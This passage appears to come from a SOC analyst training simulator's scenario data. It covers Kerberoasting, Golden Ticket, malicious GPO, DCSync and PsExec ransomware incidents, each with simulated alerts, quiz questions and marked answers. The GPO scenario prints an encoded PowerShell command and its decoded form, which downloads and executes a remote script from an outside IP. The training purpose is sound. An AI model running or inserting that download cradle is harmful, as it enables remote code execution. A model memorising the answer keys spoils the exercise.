                "instruction": "Enrich WS-DEV03 and user t.nguyen. Determine if the workstation is compromised or if the user is acting intentionally.",
                "type": "enrich",
                "hints": ["Check EDR data for tools like Rubeus, Invoke-Kerberoast, or mimikatz", "Check if the user has any legitimate reason for these requests"],
                "questions": [
                    {
                        "id": "q3",
                        "text": "The EDR shows Rubeus.exe loaded into memory. What does this confirm?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "A Kerberoasting tool is actively running — this is a confirmed attack", "correct": True, "feedback": "Correct! Rubeus is a well-known Kerberos exploitation toolkit. Its presence in memory, combined with the mass TGS requests, confirms active Kerberoasting."},
                            {"id": "b", "text": "The developer is running a legitimate security audit tool", "correct": False, "feedback": "Even if authorized, Rubeus on a developer workstation making mass TGS requests without approval is an incident requiring investigation."},
                            {"id": "c", "text": "This is an EDR false positive", "correct": False, "feedback": "Rubeus in memory + 23 TGS requests with RC4 encryption = confirmed Kerberoasting, not a false positive."},
                        ],
                        "points": 15,
                    },
                ],
            },
            {
                "id": 3,
                "title": "Assess Impact & Risk",
                "instruction": "Consider which service accounts were targeted and what access they might provide if cracked.",
                "type": "threat_intel",
                "hints": ["MSSQL service accounts often have database admin privileges", "Service accounts frequently have weak or old passwords"],
                "questions": [
                    {
                        "id": "q4",
                        "text": "Why are the targeted SPNs (MSSQL, HTTP, CIFS) particularly concerning?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "These service accounts often have elevated privileges — SQL admin, web server access, file share access across the domain", "correct": True, "feedback": "Correct! MSSQL service accounts typically have sysadmin on databases. HTTP/CIFS accounts may have broad network access. Cracking these gives the attacker significant lateral movement capabilities."},
                            {"id": "b", "text": "These are low-privilege accounts that don't matter", "correct": False, "feedback": "Service accounts running MSSQL, IIS, and CIFS services are almost always highly privileged. That's exactly why attackers target them."},
                            {"id": "c", "text": "Only the MSSQL account is concerning", "correct": False, "feedback": "ALL the targeted service accounts are concerning. HTTP and CIFS service accounts also have elevated access to web servers and file shares."},
                        ],
                        "points": 10,
                    },
                ],
            },
            {
                "id": 4,
                "title": "Respond & Contain",
                "instruction": "Create a case and determine immediate containment actions.",
                "type": "decision",
                "hints": ["The attacker may already have the tickets — you can't un-request them", "Focus on making the cracked passwords useless"],
                "questions": [
                    {
                        "id": "q5",
                        "text": "Select ALL appropriate response actions:",
                        "type": "multi_select",
                        "options": [
                            {"id": "a", "text": "Isolate WS-DEV03 from the network immediately", "correct": True},
                            {"id": "b", "text": "Reset passwords for ALL 23 targeted service accounts", "correct": True},
                            {"id": "c", "text": "Disable t.nguyen's AD account pending investigation", "correct": True},
                            {"id": "d", "text": "Check if any of the targeted service accounts use weak or old passwords", "correct": True},
                            {"id": "e", "text": "Configure AES-only Kerberos encryption (disable RC4) domain-wide", "correct": True},
                            {"id": "f", "text": "Just reset t.nguyen's password and move on", "correct": False},
                            {"id": "g", "text": "Wait to see if any service account passwords are actually cracked", "correct": False},
                        ],
                        "points": 25,
                        "feedback_correct": "Excellent! Isolate the source, reset ALL targeted service account passwords (the tickets are already extracted), disable the compromised user account, audit password strength, and harden Kerberos by disabling RC4.",
                        "feedback_partial": "Good start, but remember: the attacker already has the TGS tickets. You MUST reset the service account passwords to invalidate the stolen tickets. Also disable RC4 to prevent future Kerberoasting.",
                    },
                ],
            },
        ],
    },

    "golden-ticket": {
        "id": "golden-ticket",
        "title": "Golden Ticket — Forged Kerberos TGT",
        "difficulty": "advanced",
        "role": "senior",
        "estimated_minutes": 15,
        "description": "Anomalous authentication detected: a user account is requesting service tickets without a corresponding AS-REQ (authentication request). The TGT appears to have been forged. This is a Golden Ticket attack — the most dangerous AD persistence technique.",
        "tags": ["active-directory", "kerberos", "persistence", "golden-ticket", "windows"],
        "alert": {
            "id": "SIM-ALERT-005",
            "title": "Potential Golden Ticket: TGS without AS-REQ",
            "severity": "critical",
            "status": "open",
            "rule_name": "Kerberos Anomaly - TGS Request Without Prior Authentication",
            "source": "Domain Controller Audit",
            "timestamp": "2026-04-07T03:17:44Z",
            "host": "SRV-DC01",
            "user": "admin_backup",
            "message": "Account 'admin_backup' (Domain Admin) requested TGS tickets for 5 services but has NO corresponding AS-REQ (Event 4768) in the last 48 hours. The TGT presented has an unusual lifetime of 10 years (default is 10 hours). The TGT was issued from an unknown source — not SRV-DC01 or SRV-DC02.",
            "mitre_technique_id": "T1558.001",
            "mitre_technique_name": "Steal or Forge Kerberos Tickets: Golden Ticket",
            "mitre_tactic_name": "credential-access",
            "raw_data": {
                "event.code": "4769",
                "user.name": "admin_backup",
                "user.domain": "GUARDEDGLASS",
                "user.privileges": "Domain Admin, Enterprise Admin, Schema Admin",
                "ticket.lifetime": "87600 hours (10 years)",
                "ticket.default_lifetime": "10 hours",
                "corresponding_AS_REQ": "NONE in 48h",
                "tgt_issuer": "UNKNOWN (not SRV-DC01 or SRV-DC02)",
                "source_of_tgs_requests": "10.20.1.55",
                "services_accessed": "CIFS/SRV-DC01, LDAP/SRV-DC01, HTTP/exchange.gg.local, CIFS/SRV-FILE01, MSSQL/SQL01.gg.local",
                "time_of_activity": "03:17 (outside business hours)",
            },
        },
        "observables": [
            {"value": "10.20.1.55", "type": "ip", "context": "Source of TGS requests — should be identified"},
            {"value": "admin_backup", "type": "user", "context": "Domain Admin account used with forged ticket"},
            {"value": "SRV-DC01", "type": "host", "context": "Domain Controller targeted by the forged ticket"},
        ],
        "enrichment_results": {
            "10.20.1.55": {
                "source": "Asset Inventory + DHCP",
                "threat_level": "critical",
                "details": "IP assigned to WS-MKTG07 (Marketing department workstation). User: r.chen (Marketing Analyst). No legitimate reason for this machine to use a Domain Admin account. Machine was recently flagged for having an outdated antivirus signature.",
                "verdict": "Critical — attacker pivot point. Marketing workstation using Domain Admin credentials.",
            },
            "admin_backup": {
                "source": "Active Directory",
                "threat_level": "critical",
                "details": "Service account with Domain Admin, Enterprise Admin, and Schema Admin privileges. Created 2 years ago for AD backup operations. Password last changed 14 months ago. Account is active but should only be used by IT automation. NO interactive logons expected.",
                "verdict": "Highest privilege account — password likely compromised via NTDS.dit extraction or DCSYNC",
            },
        },
        "threat_intel": {
            "actor": "Advanced persistent threat — post-KRBTGT compromise",
            "confidence": 95,
            "ttps": ["T1558.001 - Golden Ticket", "T1003.006 - DCSync", "T1078.002 - Domain Accounts", "T1021.002 - SMB/Windows Admin Shares"],
            "context": "A Golden Ticket requires the KRBTGT account's password hash, which means the attacker has ALREADY fully compromised Active Directory (likely via DCSync or NTDS.dit extraction). This is the most severe AD compromise — the attacker can impersonate ANY user, including Domain Admins, indefinitely. The forged TGT has a 10-year lifetime and cannot be revoked by normal password resets.",
        },
        "steps": [
            {
                "id": 1,
                "title": "Identify the Golden Ticket Indicators",
                "instruction": "This alert has several hallmarks of a Golden Ticket. Identify the key anomalies.",
                "type": "review",
                "hints": ["TGS without AS-REQ means the TGT wasn't issued by the DC", "A 10-year ticket lifetime is impossible with default settings", "Activity at 3 AM from a marketing workstation using Domain Admin creds"],
                "questions": [
                    {
                        "id": "q1",
                        "text": "What is the strongest indicator that this is a Golden Ticket?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "TGS requests with no corresponding AS-REQ and an unknown TGT issuer — the ticket was forged, not issued by the DC", "correct": True, "feedback": "Correct! In normal Kerberos, a user gets a TGT from the DC (AS-REQ/AS-REP, Event 4768), then uses it to request service tickets. No AS-REQ means the TGT was created outside the DC — a forged Golden Ticket."},
                            {"id": "b", "text": "The activity happened at 3 AM", "correct": False, "feedback": "While suspicious timing supports the alert, after-hours activity alone doesn't prove a Golden Ticket. The missing AS-REQ is the definitive indicator."},
                            {"id": "c", "text": "The user is a Domain Admin", "correct": False, "feedback": "Domain Admin usage is concerning but not proof of a Golden Ticket. The missing AS-REQ and 10-year ticket lifetime are the conclusive indicators."},
                        ],
                        "points": 15,
                    },
                    {
                        "id": "q2",
                        "text": "What does a Golden Ticket attack require the attacker to already have?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "The KRBTGT account password hash — meaning AD is already fully compromised", "correct": True, "feedback": "Correct! The KRBTGT hash is used to sign ALL TGTs in the domain. Having it means the attacker can forge tickets for any user. Getting it requires DCSync or NTDS.dit extraction — total AD compromise."},
                            {"id": "b", "text": "Just the user's password", "correct": False, "feedback": "A regular password lets you get a legitimate TGT from the DC (with AS-REQ). A Golden Ticket bypasses the DC entirely — it requires the KRBTGT hash."},
                            {"id": "c", "text": "Physical access to the domain controller", "correct": False, "feedback": "Physical access isn't required. DCSync can be done remotely with Domain Admin privileges, and NTDS.dit can be exfiltrated via volume shadow copies."},
                        ],
                        "points": 15,
                    },
                ],
            },
            {
                "id": 2,
                "title": "Trace the Attack Source",
                "instruction": "Enrich 10.20.1.55 to identify the compromised host. Understand the attack timeline.",
                "type": "enrich",
                "hints": ["A marketing workstation using Domain Admin credentials is a huge red flag", "Consider: how did the attacker get the KRBTGT hash in the first place?"],
                "questions": [
                    {
                        "id": "q3",
                        "text": "WS-MKTG07 (Marketing workstation) is using Domain Admin credentials. What does this tell you about the attack scope?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "The attacker compromised a regular workstation, escalated to Domain Admin (probably via prior Kerberoasting/LSASS dump), extracted the KRBTGT hash, and is now using a Golden Ticket for persistence", "correct": True, "feedback": "Correct! This is a multi-stage attack. The Golden Ticket is a PERSISTENCE mechanism, not the initial access. The attacker was in the network long enough to fully compromise AD."},
                            {"id": "b", "text": "The marketing user r.chen is a secret Domain Admin", "correct": False, "feedback": "The enrichment shows r.chen is a Marketing Analyst with no admin privileges. The attacker is using a FORGED ticket — they don't need r.chen's actual permissions."},
                            {"id": "c", "text": "This is just one compromised machine", "correct": False, "feedback": "If the attacker has the KRBTGT hash, they've compromised the ENTIRE domain. Every account, every machine. This is far beyond one workstation."},
                        ],
                        "points": 15,
                    },
                ],
            },
            {
                "id": 3,
                "title": "Critical Response — Domain Recovery",
                "instruction": "This is the most severe Active Directory compromise possible. Select ALL necessary response actions.",
                "type": "decision",
                "hints": ["Normal password resets won't invalidate a Golden Ticket", "The KRBTGT password must be reset TWICE to fully invalidate forged tickets", "Consider: the attacker may have backdoors everywhere"],
                "questions": [
                    {
                        "id": "q4",
                        "text": "Select ALL actions required for Golden Ticket remediation:",
                        "type": "multi_select",
                        "options": [
                            {"id": "a", "text": "Reset the KRBTGT password TWICE (with 12+ hour gap between resets)", "correct": True},
                            {"id": "b", "text": "Isolate WS-MKTG07 and image for forensics", "correct": True},
                            {"id": "c", "text": "Escalate to incident commander — this is a full domain compromise", "correct": True},
                            {"id": "d", "text": "Reset ALL Domain Admin and service account passwords", "correct": True},
                            {"id": "e", "text": "Scan ALL domain controllers for persistence (scheduled tasks, WMI subscriptions, registry run keys)", "correct": True},
                            {"id": "f", "text": "Review all recent DCSync-capable accounts and Group Policy changes", "correct": True},
                            {"id": "g", "text": "Just reset the admin_backup password", "correct": False},
                            {"id": "h", "text": "Reboot the domain controller to clear the ticket", "correct": False},
                        ],
                        "points": 30,
                        "feedback_correct": "Outstanding! Double KRBTGT reset is the ONLY way to invalidate Golden Tickets. Combined with forensic imaging, full password rotation, DC persistence hunting, and escalation — this is textbook Golden Ticket response.",
                        "feedback_partial": "You're on the right track, but remember: the KRBTGT password must be reset TWICE (Kerberos keeps the current and previous hash). Also, this is a FULL domain compromise requiring incident commander escalation and comprehensive persistence hunting.",
                    },
                ],
            },
        ],
    },

    "gpo-malware": {
        "id": "gpo-malware",
        "title": "Malicious Group Policy Deployment",
        "difficulty": "intermediate",
        "role": "analyst",
        "estimated_minutes": 12,
        "description": "A new Group Policy Object was created and linked to the entire domain, deploying a scheduled task to all workstations. The GPO was created outside business hours by an account that normally doesn't manage Group Policy.",
        "tags": ["active-directory", "group-policy", "persistence", "lateral-movement", "windows"],
        "alert": {
            "id": "SIM-ALERT-006",
            "title": "Suspicious GPO Created — Domain-Wide Scheduled Task Deployment",
            "severity": "critical",
            "status": "open",
            "rule_name": "Group Policy - Unauthorized GPO Modification",
            "source": "Domain Controller Audit",
            "timestamp": "2026-04-07T02:34:11Z",
            "host": "SRV-DC01",
            "user": "svc_sccm",
            "message": "New GPO 'Windows Update Helper' created and linked to domain root (OU=GUARDEDGLASS). GPO deploys an Immediate Scheduled Task running PowerShell with encoded command. Created by svc_sccm at 02:34. This account has Group Policy Creator Owners membership but has never created a GPO before.",
            "mitre_technique_id": "T1484.001",
            "mitre_technique_name": "Domain Policy Modification: Group Policy Modification",
            "mitre_tactic_name": "defense-evasion",
            "raw_data": {
                "event.code": "5136",
                "gpo.name": "Windows Update Helper",
                "gpo.guid": "{8F4B2A1C-3E5D-4F6A-B7C8-9D0E1F2A3B4C}",
                "gpo.linked_to": "DC=guardedglass,DC=local (Domain Root)",
                "gpo.created_by": "svc_sccm",
                "gpo.created_at": "2026-04-07T02:34:11Z",
                "scheduled_task.name": "WindowsUpdateCheck",
                "scheduled_task.trigger": "Immediate + Daily at 06:00",
                "scheduled_task.action": "powershell.exe -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAyADUAMgAuADEAOAAyAC4ANAA3AC8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkA",
                "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://192.252.182.47/update.ps1')",
                "svc_sccm.type": "Service Account",
                "svc_sccm.previous_gpo_creations": 0,
            },
        },
        "observables": [
            {"value": "192.252.182.47", "type": "ip", "context": "C2 server — payload download URL in the GPO scheduled task"},
            {"value": "svc_sccm", "type": "user", "context": "SCCM service account — likely compromised"},
            {"value": "Windows Update Helper", "type": "gpo", "context": "Malicious GPO linked to domain root"},
        ],
        "enrichment_results": {
            "192.252.182.47": {
                "source": "OpenCTI + VirusTotal",
                "threat_level": "critical",
                "details": "Known C2 infrastructure. Hosting malware payloads. Associated with ransomware group 'BlackSuit'. Last seen active 6 hours ago. Hosted on bulletproof hosting in Moldova.",
                "verdict": "Confirmed malicious — ransomware C2 server",
            },
            "svc_sccm": {
                "source": "Active Directory",
                "threat_level": "high",
                "details": "SCCM service account. Member of Group Policy Creator Owners (should it be?). Password last changed 18 months ago. Has never created a GPO before this incident. Logon at 02:30 from 10.20.1.55 (WS-MKTG07 — same host as the Golden Ticket scenario).",
                "verdict": "Compromised — unauthorized use, source host previously flagged",
            },
        },
        "threat_intel": {
            "actor": "BlackSuit Ransomware Group",
            "confidence": 80,
            "ttps": ["T1484.001 - Group Policy Modification", "T1053.005 - Scheduled Task", "T1059.001 - PowerShell", "T1105 - Ingress Tool Transfer"],
            "context": "GPO-based malware deployment is a devastating technique — it pushes malicious code to EVERY domain-joined machine automatically. BlackSuit ransomware group is known for using this technique in the pre-encryption phase. The encoded PowerShell downloads a second-stage payload from their C2.",
        },
        "steps": [
            {
                "id": 1,
                "title": "Decode & Analyze the Payload",
                "instruction": "The GPO deploys a scheduled task with an encoded PowerShell command. The decoded command downloads a script from an external IP. Assess the threat.",
                "type": "review",
                "hints": ["The decoded command: IEX (New-Object Net.WebClient).DownloadString('http://192.252.182.47/update.ps1')", "IEX = Invoke-Expression — executes whatever is downloaded", "A GPO linked to domain root affects EVERY machine"],
                "questions": [
                    {
                        "id": "q1",
                        "text": "What makes this GPO deployment particularly dangerous?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "It's linked to the domain root — every domain-joined machine will execute the malicious payload automatically", "correct": True, "feedback": "Correct! A GPO linked to the domain root applies to ALL computers and users in the domain. Within one GPO refresh cycle (90 minutes by default), every machine will download and execute the ransomware payload."},
                            {"id": "b", "text": "It uses PowerShell", "correct": False, "feedback": "While PowerShell is commonly abused, the critical factor is the SCOPE — domain root means every machine is affected. A GPO on a single OU would be less severe."},
                            {"id": "c", "text": "It was created at night", "correct": False, "feedback": "Timing is suspicious but not what makes it dangerous. The key is that it deploys ransomware to EVERY domain-joined computer."},
                        ],
                        "points": 15,
                    },
                ],
            },
            {
                "id": 2,
                "title": "Enrich the C2 & Account",
                "instruction": "Check the destination IP and the account that created the GPO.",
                "type": "enrich",
                "hints": ["The IP hosts ransomware payloads", "The service account has never created a GPO before"],
                "questions": [
                    {
                        "id": "q2",
                        "text": "The C2 is linked to BlackSuit ransomware. Given the GPO deployment, what is the attack phase?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Pre-encryption staging — the attacker is deploying ransomware to all machines before triggering encryption", "correct": True, "feedback": "Correct! GPO-based deployment is a pre-encryption technique. The attacker positions the payload on every machine, then triggers mass encryption simultaneously. You may still have time to prevent encryption."},
                            {"id": "b", "text": "Initial access — this is how they got in", "correct": False, "feedback": "GPO modification requires existing Domain Admin access. This is a LATE stage attack — initial access happened much earlier."},
                            {"id": "c", "text": "Post-encryption — damage already done", "correct": False, "feedback": "The payload is being DEPLOYED, not yet executed (the scheduled task hasn't triggered everywhere yet). There may still be time to prevent encryption."},
                        ],
                        "points": 15,
                    },
                ],
            },
            {
                "id": 3,
                "title": "Emergency Response",
                "instruction": "This is a ransomware pre-encryption emergency. Every minute counts. Select immediate actions.",
                "type": "decision",
                "hints": ["GPO refresh happens every 90 minutes — some machines may already have the task", "You need to prevent the payload from executing AND remove the GPO", "Block the C2 at the firewall IMMEDIATELY"],
                "questions": [
                    {
                        "id": "q3",
                        "text": "Select ALL emergency actions (priority order matters):",
                        "type": "multi_select",
                        "options": [
                            {"id": "a", "text": "Block 192.252.182.47 at the firewall/proxy — prevent payload download", "correct": True},
                            {"id": "b", "text": "Delete or unlink the malicious GPO immediately", "correct": True},
                            {"id": "c", "text": "Force gpupdate /force on ALL machines to push the GPO removal", "correct": True},
                            {"id": "d", "text": "Disable the svc_sccm account", "correct": True},
                            {"id": "e", "text": "Search all endpoints for the scheduled task 'WindowsUpdateCheck' and remove it", "correct": True},
                            {"id": "f", "text": "Activate incident response — this is a ransomware emergency", "correct": True},
                            {"id": "g", "text": "Monitor the situation for 24 hours before acting", "correct": False},
                            {"id": "h", "text": "Only block the IP — the GPO will expire on its own", "correct": False},
                        ],
                        "points": 30,
                        "feedback_correct": "Perfect emergency response! Block C2 first (prevents payload download), remove GPO (stops further deployment), force GPO refresh (clears the malicious policy), disable compromised account, hunt for the scheduled task on all endpoints, and escalate to IR. Time is critical in pre-encryption scenarios.",
                        "feedback_partial": "You got some critical actions right, but in a ransomware pre-encryption scenario, you need ALL of these actions simultaneously. Block C2 + remove GPO + hunt for scheduled tasks + escalate. Every minute of delay means more machines get the payload.",
                    },
                ],
            },
        ],
    },

    "dcsync-detection": {
        "id": "dcsync-detection",
        "title": "DCSync — Domain Replication from Non-DC Host",
        "difficulty": "advanced",
        "role": "senior",
        "estimated_minutes": 12,
        "description": "Domain replication (DRS GetNCChanges) was requested from a workstation that is NOT a domain controller. This is a DCSync attack — the attacker is extracting all Active Directory password hashes.",
        "tags": ["active-directory", "credential-access", "dcsync", "mimikatz", "windows"],
        "alert": {
            "id": "SIM-ALERT-007",
            "title": "DCSync Detected — Replication from Non-DC Host",
            "severity": "critical",
            "status": "open",
            "rule_name": "Active Directory - Replication from Non-Domain Controller",
            "source": "Domain Controller Audit",
            "timestamp": "2026-04-07T11:28:55Z",
            "host": "SRV-DC01",
            "user": "da_johnson",
            "message": "Directory replication (DRS GetNCChanges) requested by da_johnson from 10.20.3.88 (SRV-JUMP01). This host is NOT a domain controller. DRS replication from non-DCs indicates DCSync attack (mimikatz sekurlsa::dcsync). The request targeted the domain naming context, which includes ALL user password hashes.",
            "mitre_technique_id": "T1003.006",
            "mitre_technique_name": "OS Credential Dumping: DCSync",
            "mitre_tactic_name": "credential-access",
            "raw_data": {
                "event.code": "4662",
                "event.action": "Directory Service Access",
                "user.name": "da_johnson",
                "user.domain": "GUARDEDGLASS",
                "source.ip": "10.20.3.88",
                "source.hostname": "SRV-JUMP01",
                "replication.type": "DRS GetNCChanges",
                "replication.target": "DC=guardedglass,DC=local",
                "replication.properties": "Replicating Directory Changes All",
                "host.is_domain_controller": False,
                "legitimate_replication_sources": ["SRV-DC01 (10.20.1.10)", "SRV-DC02 (10.20.1.11)"],
            },
        },
        "observables": [
            {"value": "SRV-JUMP01", "type": "host", "context": "Jump server — source of DCSync attack"},
            {"value": "10.20.3.88", "type": "ip", "context": "Jump server IP"},
            {"value": "da_johnson", "type": "user", "context": "Domain Admin account used for DCSync"},
        ],
        "enrichment_results": {
            "SRV-JUMP01": {
                "source": "Asset Inventory",
                "threat_level": "critical",
                "details": "Administrative jump server used by IT team for remote management. Windows Server 2022. Accessible via RDP from internal network. 6 admin users have access. Last RDP session: da_johnson at 11:25 from 10.20.5.22 (WS-IT04). AV signature outdated by 12 days.",
                "verdict": "High-value target compromised — admin jump server being used for domain credential extraction",
            },
            "da_johnson": {
                "source": "Active Directory + IT Directory",
                "threat_level": "critical",
                "details": "Senior IT Administrator. Domain Admin since 2023. Has 'Replicating Directory Changes All' permission (required for DCSync). Legitimate admin — but the DCSync came from a jump server, not during a normal replication task. No authorized AD migration or audit activities scheduled.",
                "verdict": "Legitimate admin account being misused — either compromised or insider threat",
            },
        },
        "threat_intel": {
            "actor": "DCSync is used by nearly all advanced threat actors post-Domain Admin compromise",
            "confidence": 95,
            "ttps": ["T1003.006 - DCSync", "T1078.002 - Domain Accounts", "T1021.001 - Remote Desktop Protocol"],
            "context": "DCSync abuses the domain replication protocol to request password hashes for any account, including KRBTGT (enabling Golden Ticket), Administrator, and every user in the domain. It's the equivalent of stealing the ntds.dit file but done remotely and silently. Any account with 'Replicating Directory Changes All' permission can perform DCSync.",
        },
        "steps": [
            {
                "id": 1,
                "title": "Understand the DCSync Attack",
                "instruction": "A non-DC host requested domain replication. Understand what data the attacker is extracting.",
                "type": "review",
                "hints": ["DRS GetNCChanges is the protocol DCs use to replicate — it returns ALL password hashes", "The request targets the full domain naming context"],
                "questions": [
                    {
                        "id": "q1",
                        "text": "What data does a DCSync attack extract?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "ALL Active Directory password hashes — every user, computer, and service account including KRBTGT", "correct": True, "feedback": "Correct! DCSync replicates the full ntds.dit equivalent, giving the attacker NTLM hashes, Kerberos keys, and password history for every account in the domain. This includes the KRBTGT hash needed for Golden Tickets."},
                            {"id": "b", "text": "Only the passwords of currently logged-in users", "correct": False, "feedback": "That would be an LSASS dump. DCSync extracts ALL accounts from Active Directory regardless of login status — the entire directory database."},
                            {"id": "c", "text": "Group Policy configuration data", "correct": False, "feedback": "DCSync targets the directory database (password hashes), not GPO data. It replicates the domain naming context which contains all account credentials."},
                        ],
                        "points": 15,
                    },
                ],
            },
            {
                "id": 2,
                "title": "Investigate the Attack Path",
                "instruction": "DCSync came from the jump server via a Domain Admin account. Trace how the attacker reached this point.",
                "type": "enrich",
                "hints": ["Check who RDP'd into the jump server recently", "Consider: was the admin account compromised, or is this an insider?"],
                "questions": [
                    {
                        "id": "q2",
                        "text": "Why is a jump server a prime target for this attack?",
                        "type": "multiple_choice",
                        "options": [
                            {"id": "a", "text": "Jump servers have admin credentials cached in memory from multiple RDP sessions — perfect for credential harvesting", "correct": True, "feedback": "Correct! Jump servers accumulate cached credentials from every admin who RDPs in. An attacker who compromises the jump server can harvest Domain Admin credentials from LSASS and use them for DCSync."},
                            {"id": "b", "text": "Jump servers have direct internet access", "correct": False, "feedback": "Jump servers typically don't have internet access. They're valuable because they have CACHED ADMIN CREDENTIALS from multiple admin sessions."},
                            {"id": "c", "text": "Jump servers are unmonitored", "correct": False, "feedback": "Jump servers should be heavily monitored. The key issue is the concentration of cached admin credentials from RDP sessions."},
                        ],
                        "points": 15,
                    },
                ],
            },
            {
                "id": 3,
                "title": "Immediate Response",
                "instruction": "The attacker now has ALL domain credentials. Determine containment and recovery actions.",
                "type": "decision",
                "hints": ["The damage is done — focus on limiting further exploitation", "The attacker has the KRBTGT hash — they can forge Golden Tickets"],
                "questions": [
                    {
                        "id": "q3",
                        "text": "Select ALL critical response actions:",
                        "type": "multi_select",
                        "options": [
                            {"id": "a", "text": "Isolate SRV-JUMP01 and image for forensics", "correct": True},
                            {"id": "b", "text": "Reset KRBTGT password twice (to prevent Golden Ticket persistence)", "correct": True},
                            {"id": "c", "text": "Reset ALL privileged account passwords (Domain Admins, service accounts)", "correct": True},
                            {"id": "d", "text": "Audit who has 'Replicating Directory Changes All' permission and remove unnecessary grants", "correct": True},
                            {"id": "e", "text": "Implement tiered admin model — no Domain Admin credentials on jump servers", "correct": True},
                            {"id": "f", "text": "Activate full incident response — assume total domain compromise", "correct": True},
                            {"id": "g", "text": "Just change da_johnson's password", "correct": False},
                            {"id": "h", "text": "Wait for the attacker to use the credentials before responding", "correct": False},
                        ],
                        "points": 30,
                        "feedback_correct": "Perfect response! DCSync means the attacker has ALL credentials. Double KRBTGT reset, full privileged password rotation, audit replication permissions, implement admin tiering (PAW/tiered model), and full IR activation. This is a total domain compromise.",
                        "feedback_partial": "Good instincts, but DCSync is a total domain compromise. The attacker has EVERY credential. You need the double KRBTGT reset (Golden Ticket prevention), full privileged password rotation, AND long-term hardening (admin tiering, permission audit).",
                    },
                ],
            },
        ],
    },

    "ransomware-lateral": {
        "id": "ransomware-lateral",
        "title": "Ransomware Lateral Movement via PsExec",
        "difficulty": "intermediate",
        "role": "analyst",
        "estimated_minutes": 12,
        "description": "Multiple workstations report suspicious service installations within minutes of each other. PsExec is being used to deploy ransomware across the network. Race against time to contain the spread.",
        "tags": ["ransomware", "lateral-movement", "psexec", "windows", "incident-response"],
        "alert": {
            "id": "SIM-ALERT-008",
            "title": "Mass PsExec Service Installation — Potential Ransomware Deployment",
            "severity": "critical",
            "status": "open",
            "rule_name": "Lateral Movement - PsExec Service Installation (Multiple Hosts)",
            "source": "Endpoint Detection",
            "timestamp": "2026-04-07T15:42:00Z",
            "host": "Multiple",
            "user": "svc_deploy",
            "message": "PSEXESVC service installed on 14 workstations within 8 minutes using the svc_deploy service account. Each installation was followed by execution of C:\\Windows\\Temp\\svchost32.exe (NOT legitimate svchost.exe — note the different path and '32' suffix). Network shares are being encrypted on SRV-FILE01 and SRV-FILE02.",
            "mitre_technique_id": "T1569.002",
            "mitre_technique_name": "System Services: Service Execution",
            "mitre_tactic_name": "execution",
            "raw_data": {
                "event.code": "7045",
                "event.action": "Service Installed",
                "service.name": "PSEXESVC",
                "file.name": "svchost32.exe",
                "file.path": "C:\\Windows\\Temp\\svchost32.exe",
                "file.hash.sha256": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01",
                "user.name": "svc_deploy",
                "affected_hosts": ["WS-001", "WS-002", "WS-003", "WS-004", "WS-005", "WS-006", "WS-007", "WS-008", "WS-009", "WS-010", "WS-011", "WS-012", "WS-013", "WS-014"],
                "file_servers_encrypting": ["SRV-FILE01", "SRV-FILE02"],
                "encryption_extension": ".blacksuit",
                "ransom_note": "README_DECRYPT.txt found on SRV-FILE01",
                "time_window": "8 minutes",
            },
        },
        "related_alerts": [
            {
                "id": "SIM-ALERT-008b",
                "title": "Ransomware File Extension Detected (.blacksuit)",
                "severity": "critical",
                "timestamp": "2026-04-07T15:44:30Z",
                "host": "SRV-FILE01",
                "rule_name": "Ransomware - Known Extension Pattern",
                "mitre_technique_id": "T1486",
                "mitre_tactic_name": "impact",
                "message": "Mass file encryption detected on SRV-FILE01. 2,847 files renamed with .blacksuit extension in 2 minutes. Ransom note README_DECRYPT.txt created in every directory.",
            },
            {
                "id": "SIM-ALERT-008c",
                "title": "Volume Shadow Copy Deletion",
                "severity": "critical",
                "timestamp": "2026-04-07T15:43:15Z",
                "host": "SRV-FILE01",
                "rule_name": "Ransomware Indicator - VSS Deletion",
                "mitre_technique_id": "T1490",
                "mitre_tactic_name": "impact",
                "message": "vssadmin.exe used to delete all volume shadow copies on SRV-FILE01. This prevents recovery from snapshots.",
            },
        ],
        "observables": [
            {"value": "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01", "type": "hash", "context": "SHA256 of svchost32.exe — the ransomware binary"},
            {"value": "svc_deploy", "type": "user", "context": "Service account used for lateral movement"},
            {"value": "SRV-FILE01", "type": "host", "context": "File server actively being encrypted"},
            {"value": "SRV-FILE02", "type": "host", "context": "File server actively being encrypted"},
        ],
        "enrichment_results": {
            "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef01": {
                "source": "VirusTotal + Internal Sandbox",
                "threat_level": "critical",
                "details": "BlackSuit ransomware variant. 62/72 AV detections on VirusTotal. Encrypts files with AES-256, appends .blacksuit extension, drops README_DECRYPT.txt ransom note. Deletes shadow copies. Kills database and backup service processes before encryption. First seen in the wild: 2025-Q3.",
                "verdict": "Confirmed ransomware — BlackSuit family",
            },
            "svc_deploy": {
                "source": "Active Directory",
                "threat_level": "critical",
                "details": "Software deployment service account. Has local admin rights on all workstations (for SCCM deployments). Password last changed 8 months ago. This account should only be used by SCCM — PsExec usage is unauthorized.",
                "verdict": "Compromised — being used for ransomware deployment",
            },
        },
        "threat_intel": {
            "actor": "BlackSuit Ransomware Group",
            "confidence": 95,
            "ttps": ["T1569.002 - Service Execution (PsExec)", "T1486 - Data Encrypted for Impact", "T1490 - Inhibit System Recovery", "T1021.002 - SMB/Windows Admin Shares"],
            "context": "BlackSuit is a ransomware-as-a-service (RaaS) operation that evolved from the Royal ransomware group. Known for targeting enterprise networks via compromised credentials and AD-based lateral movement. Average ransom demand: $1M-$10M. They also exfiltrate data for double extortion.",
        },
        "steps": [
            {
                "id": 1,
                "title": "Assess the Situation",
